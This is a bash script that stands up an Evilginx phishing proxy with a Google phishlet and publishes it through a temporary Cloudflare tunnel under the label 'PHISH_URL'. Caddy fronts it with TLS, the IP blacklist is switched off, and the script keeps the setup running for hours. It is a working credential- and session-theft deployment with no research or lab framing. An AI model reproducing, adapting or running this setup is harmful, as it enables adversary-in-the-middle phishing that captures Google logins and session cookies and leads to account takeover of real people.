#!/usr/bin/env bash
set -euo pipefail
LIMIT=${RUN_LIMIT_MINUTES:-270}
PHISHLETS_DIR="$(pwd)/phishlets"
EVILGINX=/usr/local/bin/evilginx
CLOUDFLARED=/usr/local/bin/cloudflared
CADDY=/usr/local/bin/caddy
if [ "$(id -u)" = "0" ]; then SUDO=""; else SUDO="sudo"; fi

pkill -f evilginx 2>/dev/null || true
pkill -f caddy 2>/dev/null || true

echo "--- phase 1: get tunnel url ---"
nohup "$CLOUDFLARED" tunnel --url https://127.0.0.1:443 --no-tls-verify > cloudflared.log 2>&1 &
URL=""
for i in $(seq 1 60); do
  URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' cloudflared.log | head -n1 || true)
  [ -n "$URL" ] && break
  sleep 2
done
[ -n "$URL" ] && echo "PHISH_URL=$URL" || { echo "NO_TUNNEL_URL_FOUND"; tail -n 30 cloudflared.log; }
HOST="${URL#https://}"

echo "--- install caddy ---"
curl -sL "https://github.com/caddyserver/caddy/releases/latest/download/caddy_2.9.1_linux_amd64.tar.gz" -o /tmp/caddy.tgz
tar -xzf /tmp/caddy.tgz -C /tmp caddy
$SUDO cp /tmp/caddy /usr/local/bin/caddy
caddy version

echo "--- evilginx on 8443 (lure hostname $HOST) ---"
$SUDO mkdir -p /root/.evilginx
echo "{\"phishlets\":{\"google\":{\"enabled\":true,\"hostname\":\"$HOST\",\"unauth_url\":\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"}},\"blacklist\":{\"enabled\":false,\"ip_addresses\":[],\"ip_masks\":[]}}" | $SUDO tee /root/.evilginx/config.json >/dev/null
rm -f /tmp/eg_in; mkfifo /tmp/eg_in
( sleep 7; echo "config domain $HOST"; sleep 1; echo "config ipv4 external 203.0.113.7"; sleep 1; echo "config https_port 8443"; sleep 1; echo "config autocert off"; sleep 1; echo "phishlets hostname google $HOST"; sleep 1; echo "phishlets enable google"; sleep 1; tail -f /dev/null ) > /tmp/eg_in &
"$SUDO" "$EVILGINX" -p "$PHISHLETS_DIR" -developer < /tmp/eg_in 2>&1 | tee evilginx.log &

echo "--- wait evilginx :8443 ---"
EG=0
for i in $(seq 1 30); do
  if (exec 3<>/dev/tcp/127.0.0.1/8443) 2>/dev/null; then exec 3>&-; EG=1; break; fi
  sleep 2
done
echo "EVILGINX_8443=$EG"

echo "--- caddy terminates TLS :443 -> evilginx :8443 ---"
cat > /tmp/Caddyfile <<EOF
https://$HOST:443 {
    tls internal
    reverse_proxy 127.0.0.1:8443 {
        transport http {
            tls_insecure_skip_verify
            tls_server_name $HOST
        }
    }
}
EOF
$SUDO "$CADDY" run --config /tmp/Caddyfile > caddy.log 2>&1 &
sleep 4

BOUND=0
for i in $(seq 1 30); do
  if (exec 3<>/dev/tcp/127.0.0.1/443) 2>/dev/null; then exec 3>&-; BOUND=1; break; fi
  sleep 2
done
echo "PORT443_BOUND=$BOUND"
echo "--- caddy log tail ---"
tail -n 12 caddy.log 2>/dev/null || true

echo "=== streaming evilginx output ==="
trap 'kill %5 %4 %3 %2 %1 2>/dev/null || true' EXIT
for i in $(seq 1 "$((LIMIT * 6))"); do sleep 10; done
